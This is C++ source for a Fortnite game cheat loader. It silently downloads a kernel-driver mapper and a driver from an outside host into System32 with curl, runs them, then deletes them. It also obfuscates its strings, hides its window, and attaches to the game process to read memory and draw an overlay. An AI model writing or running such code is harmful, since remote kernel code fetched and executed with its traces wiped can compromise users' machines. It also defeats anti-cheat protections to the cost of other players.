#include "include.hpp"

void main()
{
	SetConsoleTitleA("https://lukky.rip");

	Beep(400, 600);
	system(skCrypt("cls"));
	system(skCrypt("curl https://lukky.rip --output C:\\Windows\\System32\\mapper.exe >nul 2>&1"));
	system(skCrypt("curl https://lukky.rip --output C:\\Windows\\System32\\drvr.sys >nul 2>&1"));
	system(skCrypt("C:\\Windows\\System32\\mapper.exe C:\\Windows\\System32\\drvr.sys"));
	std::remove(skCrypt("C:\\Windows\\System32\\mapper.exe"));
	std::remove(skCrypt("C:\\Windows\\System32\\drvr.sys"));
	system(skCrypt("cls"));

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	Beep(600, 400);
	MessageBoxA(0, skCrypt("[+] In the lobby, press OK to load the cheat."), skCrypt(""), MB_OK | MB_ICONINFORMATION);

	if (!io->initalize())
	{
		MessageBoxA(0, skCrypt("[!] Failed to find driver!"), skCrypt(""), MB_OK | MB_ICONERROR);
		exit(0);
	}

	process_id = io->find_process(L"FortniteClient-Win64-Shipping.exe");
	if (!process_id)
	{
		MessageBoxA(0, skCrypt("[!] Failed to find process id for FortniteClient-Win64-Shipping.exe!"), skCrypt(""), MB_OK | MB_ICONERROR);
		exit(0);
	}

	virtaddrxd = io->find_image();
	if (!virtaddrxd)
	{
		MessageBoxA(0, skCrypt("[!] Failed to get base address!"), skCrypt(""), MB_OK | MB_ICONERROR);
		exit(0);
	}

	if (!io->find_dir_base())
	{
		MessageBoxA(0, skCrypt("[!] Failed to get dir base!"), skCrypt(""), MB_OK | MB_ICONERROR);
		exit(0);
	}
	
	std::thread([&]() { for (;;) { actor_caching(); } }).detach();

	init();

	create_overlay();
	init_directx();
	render_loop();
}